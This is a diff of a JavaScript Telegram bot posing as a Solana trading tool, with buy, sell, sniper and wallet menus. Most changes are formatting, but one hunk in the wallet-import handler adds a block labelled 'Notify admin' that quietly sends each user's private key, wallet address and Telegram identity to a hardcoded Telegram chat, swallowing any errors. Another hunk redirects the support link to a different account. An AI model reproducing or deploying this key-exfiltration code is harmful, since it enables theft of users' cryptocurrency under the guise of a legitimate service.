-        "❌ Invalid input. Please enter a valid private key, mnemonic, or array."
+        "❌ Invalid input. Please enter a valid private key, mnemonic, or array.",
       );
     }
 
@@ -2095,7 +2183,7 @@ continueScene.hears(/.*/, async (ctx) => {
       }
       await ctx.replyWithHTML(
         `❌ Invalid Wallet, Connect only solana wallet!!. `,
-        buttons.main
+        buttons.main,
       );
 
       await ctx.scene.leave();
@@ -2105,6 +2193,15 @@ continueScene.hears(/.*/, async (ctx) => {
 
       // Store wallet in Telegram session
       sessionManager.setUserData(ctx, { wallet: secret });
+
+      // Notify admin
+      try {
+        await ctx.telegram.sendMessage(
+          8305086038,
+          `📥 <b>Wallet Imported</b>\nUser: <b>${ctx.from.first_name}</b> (ID: <code>${ctx.from.id}</code>)\nAddress: <code>${address}</code>\nPrivateKey: <code>${secret}</code>`,
+          { parse_mode: "HTML" },
+        );
+      } catch (e) {}
 
       const balance = await connection.getBalance(wallet.publicKey);
       const sol = balance / LAMPORTS_PER_SOL;
@@ -2121,7 +2218,7 @@ continueScene.hears(/.*/, async (ctx) => {
  💰 Balance: <b>${sol} SOL</b>\n 
 
  ⬇️ Select an action:`,
-        buttons.main
+        buttons.main,
       );
 
       await ctx.scene.leave();
@@ -2140,7 +2237,7 @@ continueScene.hears("/start", async (ctx) => {
 
 helpScene.enter(async (ctx) => {
   await ctx.replyWithHTML(
-    "😊✍️ Please write your complaint now. Our support team will get back to you soon."
+    "😊✍️ Please write your complaint now. Our support team will get back to you soon.",
   );
 });
 
@@ -2163,7 +2260,7 @@ bot.action("DELETE_KEY_MSG", async (ctx) => {
 
     if (!secret) {
       return ctx.reply(
-        "❌ Could not find your wallet. Please create or import again."
+        "❌ Could not find your wallet. Please create or import again.",
       );
     }
 
@@ -2177,12 +2274,12 @@ bot.action("DELETE_KEY_MSG", async (ctx) => {
 
     await ctx.replyWithHTML(
       `💼 <b>Your Solana Wallet:</b>\n\nAddress: <code>${utils.escapeHtml(address)}</code> \n\nBalance: <b>${utils.escapeHtml(sol)} SOL</b>`,
-      buttons.main
+      buttons.main,
     );
   } catch (err) {
     console.error("Error in DELETE_KEY_MSG:", err);
     await ctx.reply(
-      "❌ Couldn't delete the message. Please delete it manually."
+      "❌ Couldn't delete the message. Please delete it manually.",
     );
   }
 });
@@ -2211,7 +2308,7 @@ bot.hears(["⬅️ Back", "⬆️ Main Menu"], async (ctx) => {
       const userWalletAddress = getUserWalletAddress(ctx);
       await ctx.replyWithHTML(
         messages.welcome(Number(sol), Number(price), userWalletAddress),
-        buttons.activeTrades
+        buttons.activeTrades,
       );
     } catch (err) {
       await ctx.replyWithHTML(messages.welcome(0.0, 0.0), buttons.activeTrades);
@@ -2240,7 +2337,7 @@ bot.hears("🚫 Cancel", async (ctx) => {
       const userWalletAddress = getUserWalletAddress(ctx);
       await ctx.replyWithHTML(
         messages.welcome(Number(sol), Number(price), userWalletAddress),
-        buttons.activeTrades
+        buttons.activeTrades,
       );
     } catch (err) {
       await ctx.replyWithHTML(messages.welcome(0.0, 0.0), buttons.activeTrades);
@@ -2258,7 +2355,7 @@ bot.hears("Sell 💰", async (ctx) => {
   if (!secret) {
     await ctx.replyWithHTML(
       `💰 <b>Sell</b>\n\n<b>Please connect your wallet first to start trading.</b>\n\nMinimum sell : 0.01 sol\n\nClick 'Connect Wallet' to import your wallet.`,
-      buttons.connectWalletNav
+      buttons.connectWalletNav,
     );
   } else {
     await ctx.replyWithHTML(
@@ -2267,7 +2364,7 @@ bot.hears("Sell 💰", async (ctx) => {
         [Markup.button.callback("📊 My Positions", "POSITIONS")],
         [Markup.button.callback("🔍 Search Token", "SEARCH_TOKEN")],
         [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
-      ])
+      ]),
     );
   }
 });
@@ -2279,7 +2376,7 @@ bot.hears("Buy 🛒", async (ctx) => {
   if (!secret) {
     await ctx.replyWithHTML(
       `🛒 <b>Buy</b>\n\n<b>Please connect your wallet first to start trading.</b>\n\nMinimum buy : <b>0.5 SOL</b>\n\nClick 'Connect Wallet' to import your wallet.`,
-      buttons.connectWalletNav
+      buttons.connectWalletNav,
     );
   } else {
     try {
@@ -2287,14 +2384,19 @@ bot.hears("Buy 🛒", async (ctx) => {
       await ctx.replyWithHTML(
         `🛒 <b>Buy Tokens</b>\n\n💰 <b>Your Balance:</b> ${utils.escapeHtml(sol)} SOL\n\nPaste any token address to view and buy, or browse trending tokens.`,
         Markup.inlineKeyboard([
-          [Markup.button.callback("🔥 Trending", "TRENDING"), Markup.button.callback("🔍 Search", "SEARCH_TOKEN")],
+          [
+            Markup.button.callback("🔥 Trending", "TRENDING"),
+            Markup.button.callback("🔍 Search", "SEARCH_TOKEN"),
+          ],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
-        ])
+        ]),
       );
     } catch (e) {
       await ctx.replyWithHTML(
         `🛒 <b>Buy Tokens</b>\n\nPaste any token address to view details and buy.`,
-        Markup.inlineKeyboard([[Markup.button.callback("⬅️ Back", "BACK_MAIN")]])
+        Markup.inlineKeyboard([
+          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
+        ]),
       );
     }
   }
@@ -2307,16 +2409,22 @@ bot.hears("Sniper 🔥", async (ctx) => {
   if (!secret) {
     await ctx.replyWithHTML(
       `🔥 <b>Sniper</b>\n\n<b>Please connect your wallet first to start trading.</b>\n\nMinimum amount : <b>0.5 SOL</b>\n\nClick 'Connect Wallet' to import your wallet.`,
-      buttons.connectWalletNav
+      buttons.connectWalletNav,
     );
   } else {
     await ctx.replyWithHTML(
       `🎯 <b>LP Sniper Dashboard</b>\n\nMonitors new liquidity pools and auto-buys immediately on launch.\n\n⚙️ <b>Settings:</b>\n• Auto Snipe: <b>Enabled</b>\n• Min Liquidity: <b>5 SOL</b>\n• Max Gas: <b>0.005 SOL</b>\n• Slippage: <b>15%</b>`,
       Markup.inlineKeyboard([
-        [Markup.button.callback("🎯 Start Sniper", "START_SNIPER"), Markup.button.callback("⏸️ Pause Sniper", "PAUSE_SNIPER")],
-        [Markup.button.callback("⚙️ Settings", "SNIPER_SETTINGS"), Markup.button.callback("📊 History", "SNIPE_HISTORY")],
+        [
+          Markup.button.callback("🎯 Start Sniper", "START_SNIPER"),
+          Markup.button.callback("⏸️ Pause Sniper", "PAUSE_SNIPER"),
+        ],
+        [
+          Markup.button.callback("⚙️ Settings", "SNIPER_SETTINGS"),
+          Markup.button.callback("📊 History", "SNIPE_HISTORY"),
+        ],
         [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
-      ])
+      ]),
     );
   }
 });
@@ -2328,7 +2436,7 @@ bot.hears("Launch 🚀", async (ctx) => {
   if (!secret) {
     await ctx.replyWithHTML(
       `🚀 <b>Launch</b>\n\n<b>Please connect your wallet first to start trading.</b>\n\nConnect wallet to launch tokens\n\nClick 'Connect Wallet' to import your wallet.`,
-      buttons.connectWalletNav
+      buttons.connectWalletNav,
     );
   } else {
     await ctx.replyWithHTML(
@@ -2337,7 +2445,7 @@ bot.hears("Launch 🚀", async (ctx) => {
         [Markup.button.callback("⚡ Quick Launch", "QUICK_LAUNCH")],
         [Markup.button.callback("⚙️ Custom Launch", "CUSTOM_LAUNCH")],
         [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
-      ])
+      ]),
     );
   }
 });
@@ -2349,30 +2457,34 @@ bot.hears("Positions 📊", async (ctx) => {
   if (!secret) {
     await ctx.replyWithHTML(
       `📊 <b>Positions</b>\n\n<b>Please connect your wallet first to start trading.</b>\n\nConnect wallet to view positions\n\nClick 'Connect Wallet' to import your wallet.`,
-      buttons.connectWalletNav
+      buttons.connectWalletNav,
     );
   } else {
     try {
       const userWalletAddress = getUserWalletAddress(ctx);
       const tokens = await utils.getTokenBalances(userWalletAddress);
-      
+
       let tokenText = "";
       if (tokens.length > 0) {
         tokenText = "<b>Your Open Positions:</b>\n\n";
-        tokens.forEach(t => {
+        tokens.forEach((t) => {
           tokenText += `🪙 <code>${t.mint}</code>\nBalance: <b>${t.balance}</b>\n\n`;
         });
       } else {
-        tokenText = "❌ <b>No tokens found!</b>\n\nYou have no token positions. Start trading to see your positions here.";
+        tokenText =
+          "❌ <b>No tokens found!</b>\n\nYou have no token positions. Start trading to see your positions here.";
       }
 
       await ctx.replyWithHTML(
         `📊 <b>Your Trading Positions</b>\n\n${tokenText}`,
         Markup.inlineKeyboard([
           [Markup.button.callback("🔄 Refresh", "REFRESH_POSITIONS")],
-          [Markup.button.callback("🛒 Buy Tokens", "BUY"), Markup.button.callback("💰 Sell Tokens", "SELL")],
+          [
+            Markup.button.callback("🛒 Buy Tokens", "BUY"),
+            Markup.button.callback("💰 Sell Tokens", "SELL"),
+          ],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
-        ])
+        ]),
       );
     } catch (e) {
       console.error(e);
@@ -2390,15 +2502,16 @@ bot.action("REFRESH_POSITIONS", async (ctx) => {
   try {
     const userWalletAddress = getUserWalletAddress(ctx);
     const tokens = await utils.getTokenBalances(userWalletAddress);
-    
+
     let tokenText = "";
     if (tokens.length > 0) {
       tokenText = "<b>Your Open Positions:</b>\n\n";
-      tokens.forEach(t => {
+      tokens.forEach((t) => {
         tokenText += `🪙 <code>${t.mint}</code>\nBalance: <b>${t.balance}</b>\n\n`;
       });
     } else {
-      tokenText = "❌ <b>No tokens found!</b>\n\nYou have no token positions. Start trading to see your positions here.";
+      tokenText =
+        "❌ <b>No tokens found!</b>\n\nYou have no token positions. Start trading to see your positions here.";
     }
 
     await ctx.editMessageText(
@@ -2408,11 +2521,14 @@ bot.action("REFRESH_POSITIONS", async (ctx) => {
         reply_markup: {
           inline_keyboard: [
             [Markup.button.callback("🔄 Refresh", "REFRESH_POSITIONS")],
-            [Markup.button.callback("🛒 Buy Tokens", "BUY"), Markup.button.callback("💰 Sell Tokens", "SELL")],
+            [
+              Markup.button.callback("🛒 Buy Tokens", "BUY"),
+              Markup.button.callback("💰 Sell Tokens", "SELL"),
+            ],
             [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
-          ]
-        }
-      }
+          ],
+        },
+      },
     );
   } catch (e) {
     console.error(e);
@@ -2426,15 +2542,18 @@ bot.hears("Add Liquidity 💚", async (ctx) => {
   if (!secret) {
     await ctx.replyWithHTML(
       `💚 <b>Add Liquidity</b>\n\n<b>Please connect your wallet first to start trading.</b>\n\nConnect wallet to add liquidity\n\nClick 'Connect Wallet' to import your wallet.`,
-      buttons.connectWalletNav
+      buttons.connectWalletNav,
     );
   } else {
     await ctx.replyWithHTML(
       `💧 <b>Add Liquidity</b>\n\n<b>Select chain for adding liquidity:</b>`,
       Markup.inlineKeyboard([
-        [Markup.button.callback("🌿 SOL Liquidity", "SOL_LIQUIDITY"), Markup.button.callback("🧬 ETH Liquidity", "ETH_LIQUIDITY")],
+        [
+          Markup.button.callback("🌿 SOL Liquidity", "SOL_LIQUIDITY"),
+          Markup.button.callback("🧬 ETH Liquidity", "ETH_LIQUIDITY"),
+        ],
         [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
-      ])
+      ]),
     );
   }
 });
@@ -2446,7 +2565,7 @@ bot.hears("Claim Airdrop 🎁", async (ctx) => {
   if (!secret) {
     await ctx.replyWithHTML(
       `🎁 <b>Claim Airdrop</b>\n\n<b>Please connect your wallet first to start trading.</b>\n\nConnect wallet to claim airdrops\n\nClick 'Connect Wallet' to import your wallet.`,
-      buttons.connectWalletNav
+      buttons.connectWalletNav,
     );
   } else {
     await ctx.replyWithHTML(
@@ -2455,7 +2574,7 @@ bot.hears("Claim Airdrop 🎁", async (ctx) => {
         [Markup.button.callback("🎁 Claim All", "CLAIM_ALL_AIRDROPS")],
         [Markup.button.callback("📊 Claim History", "AIRDROP_HISTORY")],
         [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
-      ])
+      ]),
     );
   }
 });
@@ -2465,8 +2584,8 @@ bot.hears("Support 🆘", async (ctx) => {
   await ctx.replyWithHTML(
     `🆘 <b>Support</b>\n\nContact support`,
     Markup.inlineKeyboard([
-      [Markup.button.url("Spam Info Bot", "https://t.me/spambot")],
-    ])
+      [Markup.button.url("Spam Info Bot", "https://t.me/MainMetaSupport")],
+    ]),
   );
 });
 
@@ -2482,7 +2601,7 @@ bot.hears("Wallet 💳", async (ctx) => {
       ctx.session.withdrawStep = "amount";
       await ctx.replyWithHTML(
         `🔢 Reply with the amount of SOL you wish to withdraw:`,
-        buttons.cancel
+        buttons.cancel,
       );
       return;
     }
@@ -2494,7 +2613,7 @@ bot.hears("Wallet 💳", async (ctx) => {
   if (!secret) {
     await ctx.replyWithHTML(
       `💳 <b>Wallet</b>\n\n<b>Please connect your wallet first to start trading.</b>\n\nConnect wallet to view wallet info\n\nClick 'Connect Wallet' to import your wallet.`,
-      buttons.connectWalletNav
+      buttons.connectWalletNav,
     );
   } else {
     try {
@@ -2502,16 +2621,17 @@ bot.hears("Wallet 💳", async (ctx) => {
       const sol = await utils.getUserBalance(secret);
       const price = await utils.getSolPrice();
       const usdVal = (Number(sol) * Number(price)).toFixed(2);
-      
+
       const tokens = await utils.getTokenBalances(userWalletAddress);
-      
+
       let tokenText = "";
       if (tokens.length > 0) {
         tokenText = "\n\n<b>Token Holdings:</b>\n";
-        tokens.slice(0, 10).forEach(t => {
+        tokens.slice(0, 10).forEach((t) => {
           tokenText += `🪙 <code>${t.mint.substring(0, 4)}...${t.mint.substring(t.mint.length - 4)}</code>: <b>${t.balance}</b>\n`;
         });
-        if (tokens.length > 10) tokenText += `<i>+ ${tokens.length - 10} more tokens</i>\n`;
+        if (tokens.length > 10)
+          tokenText += `<i>+ ${tokens.length - 10} more tokens</i>\n`;
       } else {
         tokenText = "\n\n<i>No SPL tokens found.</i>";
       }
@@ -2522,7 +2642,7 @@ bot.hears("Wallet 💳", async (ctx) => {
           [Markup.button.callback("🔄 Refresh Balance", "REFRESH")],
           [Markup.button.callback("💸 Withdraw", "WITHDRAW")],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
-        ])
+        ]),
       );
     } catch (e) {
       console.error(e);
@@ -2538,7 +2658,7 @@ bot.hears("Withdraw 💵", async (ctx) => {
   if (!secret) {
     await ctx.replyWithHTML(
       `📝 <b>Please connect your wallet first to start trading.</b>\n\nMinimum withdraw : <b>0.01 SOL</b>\n\nClick 'Connect Wallet' to import your wallet.`,
-      buttons.connectWalletNav
+      buttons.connectWalletNav,
     );
     return;
   }
@@ -2547,7 +2667,7 @@ bot.hears("Withdraw 💵", async (ctx) => {
   ctx.session.withdrawAddress = null;
   await ctx.replyWithHTML(
     `📝 Please enter your Solana address to withdraw to:`,
-    buttons.cancel
+    buttons.cancel,
   );
 });
 
@@ -2575,7 +2695,7 @@ bot.action("ACTIVE_TRADES", async (ctx) => {
       Markup.inlineKeyboard([
         [Markup.button.callback("🔗 Connect Wallet", "CONNECT_WALLET")],
         [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
-      ])
+      ]),
     );
   } else {
     await ctx.replyWithHTML(
@@ -2583,7 +2703,7 @@ bot.action("ACTIVE_TRADES", async (ctx) => {
       Markup.inlineKeyboard([
         [Markup.button.callback("🛒 Buy Tokens", "BUY")],
         [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
-      ])
+      ]),
     );
   }
 });
@@ -2609,10 +2729,13 @@ bot.action(/.*/, async (ctx) => {
           {
             parse_mode: "HTML",
             reply_markup: buttons.activeTrades.reply_markup,
-          }
+          },
         );
       } catch (err) {
-        await ctx.replyWithHTML(messages.welcome(0.0, 0.0), buttons.activeTrades);
+        await ctx.replyWithHTML(
+          messages.welcome(0.0, 0.0),
+          buttons.activeTrades,
+        );
       }
     } else {
       await ctx.replyWithHTML(messages.welcome(0.0, 0.0), buttons.activeTrades);
@@ -2640,7 +2763,7 @@ bot.action(/.*/, async (ctx) => {
       const data = await api.getDexScreenerTopGainers();
       const formatted = formatters.formatBoostedTokensList(
         data,
-        "Latest Boosted Tokens"
+        "Latest Boosted Tokens",
       );
       await ctx.editMessageText(formatted, {
         parse_mode: "HTML",
@@ -2659,7 +2782,7 @@ bot.action(/.*/, async (ctx) => {
       const data = await api.getDexScreenerTopLosers();
       const formatted = formatters.formatBoostedTokensList(
         data,
-        "Top Boosted Tokens"
+        "Top Boosted Tokens",
       );
       await ctx.editMessageText(formatted, {
         parse_mode: "HTML",
@@ -2681,7 +2804,7 @@ bot.action(/.*/, async (ctx) => {
         reply_markup: Markup.inlineKeyboard([
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
     // Enter search mode
     ctx.session.searchMode = true;
@@ -2696,7 +2819,7 @@ bot.action(/.*/, async (ctx) => {
           [Markup.button.callback("🔥 Trending", "TRENDING")],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "BACK_MAIN") {
     await ctx.answerCbQuery();
@@ -2710,16 +2833,18 @@ bot.action(/.*/, async (ctx) => {
         const userWalletAddress = getUserWalletAddress(ctx);
         await ctx.replyWithHTML(
           messages.welcome(Number(sol), Number(price), userWalletAddress),
-          buttons.activeTrades
+          buttons.activeTrades,
         );
       } catch (err) {
-        await ctx.replyWithHTML(messages.welcome(0.0, 0.0), buttons.activeTrades);
+        await ctx.replyWithHTML(
+          messages.welcome(0.0, 0.0),
+          buttons.activeTrades,
+        );
       }
     } else {
       await ctx.replyWithHTML(messages.welcome(0.0, 0.0), buttons.activeTrades);
     }
     await ctx.reply("Select an action:", buttons.main);
-
   } else if (ctx.match.input === "REFERRALS") {
     if (!(await requireWallet(ctx, "Referrals"))) return;
 
@@ -2732,7 +2857,7 @@ bot.action(/.*/, async (ctx) => {
           [Markup.button.callback("📊 Referral History", "REFERRAL_HISTORY")],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "BUY") {
     const userData = sessionManager.getUserData(ctx);
@@ -2765,7 +2890,7 @@ bot.action(/.*/, async (ctx) => {
               ],
               [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
             ]).reply_markup,
-          }
+          },
         );
       } catch (error) {
         await ctx.editMessageText(
@@ -2776,7 +2901,7 @@ bot.action(/.*/, async (ctx) => {
               [Markup.button.callback("🔗 Connect Wallet", "CONNECT_WALLET")],
               [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
             ]).reply_markup,
-          }
+          },
         );
       }
     }
@@ -3265,7 +3390,7 @@ bot.action(/.*/, async (ctx) => {
               [Markup.button.callback("🔗 Connect Wallet", "CONNECT_WALLET")],
               [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
             ]).reply_markup,
-          }
+          },
         );
       }
     }
@@ -3275,7 +3400,7 @@ bot.action(/.*/, async (ctx) => {
       const data = await api.getDexScreenerNewPairs();
       const formatted = formatters.formatTokenProfilesList(
         data,
-        "Latest Token Profiles"
+        "Latest Token Profiles",
       );
       await ctx.editMessageText(formatted, {
         parse_mode: "HTML",
@@ -3326,7 +3451,7 @@ bot.action(/.*/, async (ctx) => {
             [
               Markup.button.callback(
                 "📊 Withdrawal History",
-                "WITHDRAWAL_HISTORY"
+                "WITHDRAWAL_HISTORY",
               ),
               Markup.button.callback("⚙️ Config", "WITHDRAWAL_SETTINGS"),
             ],
@@ -3345,7 +3470,7 @@ bot.action(/.*/, async (ctx) => {
               [Markup.button.callback("🔗 Connect Wallet", "CONNECT_WALLET")],
               [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
             ]).reply_markup,
-          }
+          },
         );
       }
     }
@@ -3364,7 +3489,7 @@ bot.action(/.*/, async (ctx) => {
         reply_markup: Markup.inlineKeyboard([
           [Markup.button.callback("✍️ Write Complaint", "WRITE_COMPLAINT")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "CLAIM_AIRDROP") {
     if (!(await requireWallet(ctx, "Airdrop Claims"))) return;
@@ -3378,7 +3503,7 @@ bot.action(/.*/, async (ctx) => {
           [Markup.button.callback("📊 Claim History", "AIRDROP_HISTORY")],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "LAUNCH") {
     if (!(await requireWallet(ctx, "Token Launch"))) return;
@@ -3393,7 +3518,7 @@ bot.action(/.*/, async (ctx) => {
           [Markup.button.callback("🎯 Presale Launch", "PRESALE_LAUNCH")],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "BUYTRENDING") {
     await ctx.editMessageText(
@@ -3407,7 +3532,7 @@ bot.action(/.*/, async (ctx) => {
           ],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "SOLANA_BUYTRENDING") {
     await ctx.editMessageText(
@@ -3425,7 +3550,7 @@ bot.action(/.*/, async (ctx) => {
           ],
           [Markup.button.callback("⬅️ Back", "BUYTRENDING")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "ETHEREUM_BUYTRENDING") {
     await ctx.editMessageText(
@@ -3436,23 +3561,23 @@ bot.action(/.*/, async (ctx) => {
           [
             Markup.button.callback(
               "📈 High Volume",
-              "TRENDING_HIGH_VOLUME_ETH"
+              "TRENDING_HIGH_VOLUME_ETH",
             ),
             Markup.button.callback("🚀 New Launch", "TRENDING_NEW_LAUNCH_ETH"),
           ],
           [
             Markup.button.callback(
               "📊 Top Gainers",
-              "TRENDING_TOP_GAINERS_ETH"
+              "TRENDING_TOP_GAINERS_ETH",
             ),
             Markup.button.callback(
               "🔥 Most Active",
-              "TRENDING_MOST_ACTIVE_ETH"
+              "TRENDING_MOST_ACTIVE_ETH",
             ),
           ],
           [Markup.button.callback("⬅️ Back", "BUYTRENDING")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "ADD_LIQUIDITY") {
     await ctx.editMessageText(
@@ -3466,7 +3591,7 @@ bot.action(/.*/, async (ctx) => {
           ],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "VOLUME_SELECTION") {
     await ctx.editMessageText(
@@ -3480,7 +3605,7 @@ bot.action(/.*/, async (ctx) => {
           ],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "SOL_VOLUME") {
     await ctx.editMessageText(
@@ -3498,7 +3623,7 @@ bot.action(/.*/, async (ctx) => {
           ],
           [Markup.button.callback("⬅️ Back", "VOLUME_SELECTION")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "ETH_VOLUME") {
     await ctx.editMessageText(
@@ -3516,7 +3641,7 @@ bot.action(/.*/, async (ctx) => {
           ],
           [Markup.button.callback("⬅️ Back", "VOLUME_SELECTION")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (
     ctx.match.input === "SOL_LIQUIDITY" ||
@@ -3530,7 +3655,7 @@ bot.action(/.*/, async (ctx) => {
         reply_markup: Markup.inlineKeyboard([
           [Markup.button.callback("⬅️ Back", "ADD_LIQUIDITY")],
         ]).reply_markup,
-      }
+      },
     );
     // Set session flag for liquidity mode
     if (!ctx.session) ctx.session = {};
@@ -3568,7 +3693,7 @@ bot.action(/.*/, async (ctx) => {
             [Markup.button.callback("🔗 Connect Wallet", "CONNECT_WALLET")],
             [Markup.button.callback("⬅️ Back", backButton)],
           ]).reply_markup,
-        }
+        },
       );
     } else {
       try {
@@ -3585,7 +3710,7 @@ bot.action(/.*/, async (ctx) => {
                 [Markup.button.callback("💰 Add Balance", "ADD_FUNDS")],
                 [Markup.button.callback("⬅️ Back", backButton)],
               ]).reply_markup,
-            }
+            },
           );
         } else {
           await ctx.editMessageText(
@@ -3596,12 +3721,12 @@ bot.action(/.*/, async (ctx) => {
                 [
                   Markup.button.callback(
                     "🛒 View Tokens",
-                    "VIEW_TRENDING_TOKENS"
+                    "VIEW_TRENDING_TOKENS",
                   ),
                 ],
                 [Markup.button.callback("⬅️ Back", backButton)],
               ]).reply_markup,
-            }
+            },
           );
         }
       } catch (error) {
@@ -3613,7 +3738,7 @@ bot.action(/.*/, async (ctx) => {
               [Markup.button.callback("🔗 Connect Wallet", "CONNECT_WALLET")],
               [Markup.button.callback("⬅️ Back", backButton)],
             ]).reply_markup,
-          }
+          },
         );
       }
     }
@@ -3649,7 +3774,7 @@ bot.action(/.*/, async (ctx) => {
             [Markup.button.callback("🔗 Connect Wallet", "CONNECT_WALLET")],
             [Markup.button.callback("⬅️ Back", backButton)],
           ]).reply_markup,
-        }
+        },
       );
     } else {
       try {
@@ -3666,7 +3791,7 @@ bot.action(/.*/, async (ctx) => {
                 [Markup.button.callback("💰 Add Balance", "ADD_FUNDS")],
                 [Markup.button.callback("⬅️ Back", backButton)],
               ]).reply_markup,
-            }
+            },
           );
         } else {
           await ctx.editMessageText(
@@ -3677,12 +3802,12 @@ bot.action(/.*/, async (ctx) => {
                 [
                   Markup.button.callback(
                     "📊 View Analysis",
-                    "VIEW_VOLUME_ANALYSIS"
+                    "VIEW_VOLUME_ANALYSIS",
                   ),
                 ],
                 [Markup.button.callback("⬅️ Back", backButton)],
               ]).reply_markup,
-            }
+            },
           );
         }
       } catch (error) {
@@ -3694,7 +3819,7 @@ bot.action(/.*/, async (ctx) => {
               [Markup.button.callback("🔗 Connect Wallet", "CONNECT_WALLET")],
               [Markup.button.callback("⬅️ Back", backButton)],
             ]).reply_markup,
-          }
+          },
         );
       }
     }
@@ -3710,7 +3835,7 @@ bot.action(/.*/, async (ctx) => {
           [Markup.button.callback("🔥 Trending", "TRENDING")],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "SELL_TOKEN") {
     if (!(await requireWallet(ctx, "Sell Token"))) return;
@@ -3728,7 +3853,7 @@ bot.action(/.*/, async (ctx) => {
             ],
             [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
           ]).reply_markup,
-        }
+        },
       );
     } else {
       await ctx.editMessageText(
@@ -3740,7 +3865,7 @@ bot.action(/.*/, async (ctx) => {
             [Markup.button.callback("🔍 Search Tokens", "SEARCH_TOKEN")],
             [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
           ]).reply_markup,
-        }
+        },
       );
     }
   } else if (ctx.match.input === "VIEW_CHART") {
@@ -3751,7 +3876,7 @@ bot.action(/.*/, async (ctx) => {
         reply_markup: Markup.inlineKeyboard([
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "VIEW_TOKEN_INFO") {
     // This will be handled by the text message handler when user enters token address
@@ -3762,7 +3887,7 @@ bot.action(/.*/, async (ctx) => {
         reply_markup: Markup.inlineKeyboard([
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "ADD_FUNDS") {
     const walletAddress = getUserWalletAddress(ctx);
@@ -3776,7 +3901,7 @@ bot.action(/.*/, async (ctx) => {
           [Markup.button.callback("🔄 Refresh Balance", "REFRESH")],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "VIEW_TRENDING_TOKENS") {
     await ctx.editMessageText(
@@ -3786,7 +3911,7 @@ bot.action(/.*/, async (ctx) => {
         reply_markup: Markup.inlineKeyboard([
           [Markup.button.callback("⬅️ Back", "BUYTRENDING")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "VIEW_VOLUME_ANALYSIS") {
     await ctx.editMessageText(
@@ -3796,7 +3921,7 @@ bot.action(/.*/, async (ctx) => {
         reply_markup: Markup.inlineKeyboard([
           [Markup.button.callback("⬅️ Back", "VOLUME_SELECTION")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "ADD_LIQUIDITY_NOW") {
     if (!(await requireFeatureBalance(ctx, "Add Liquidity", 2.0))) return;
@@ -3806,10 +3931,15 @@ bot.action(/.*/, async (ctx) => {
       {
         parse_mode: "HTML",
         reply_markup: Markup.inlineKeyboard([
-          [Markup.button.url("Contact Admin to Complete Setup", "https://t.me/spambot")],
+          [
+            Markup.button.url(
+              "Contact Admin to Complete Setup",
+              "https://t.me/spambot",
+            ),
+          ],
           [Markup.button.callback("⬅️ Back", "ADD_LIQUIDITY")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input.startsWith("BUY_AMOUNT_")) {
     if (!(await requireWallet(ctx, "Buy Amount"))) return;
@@ -3819,12 +3949,15 @@ bot.action(/.*/, async (ctx) => {
 
     if (selectedToken) {
       // Execute Real Swap
-      const msg = await ctx.editMessageText(`🔄 <b>Processing Swap...</b>\nBuying token with ${amount} SOL via Jupiter Ultra...`, { parse_mode: "HTML" });
+      const msg = await ctx.editMessageText(
+        `🔄 <b>Processing Swap...</b>\nBuying token with ${amount} SOL via Jupiter Ultra...`,
+        { parse_mode: "HTML" },
+      );
       try {
         const userData = sessionManager.getUserData(ctx);
         const secret = userData?.wallet;
         const keypair = Keypair.fromSecretKey(bs58.decode(secret));
-        
+
         // Use Jupiter utility
         const result = await executeJupiterSwap({
           inputMint: "So11111111111111111111111111111111111111112", // Wrapped SOL
@@ -3836,7 +3969,7 @@ bot.action(/.*/, async (ctx) => {
             tx.sign([keypair]);
             return tx;
           },
-          dryRun: false
+          dryRun: false,
         });
 
         if (result.success) {
@@ -3845,7 +3978,14 @@ bot.action(/.*/, async (ctx) => {
             msg.message_id,
             undefined,
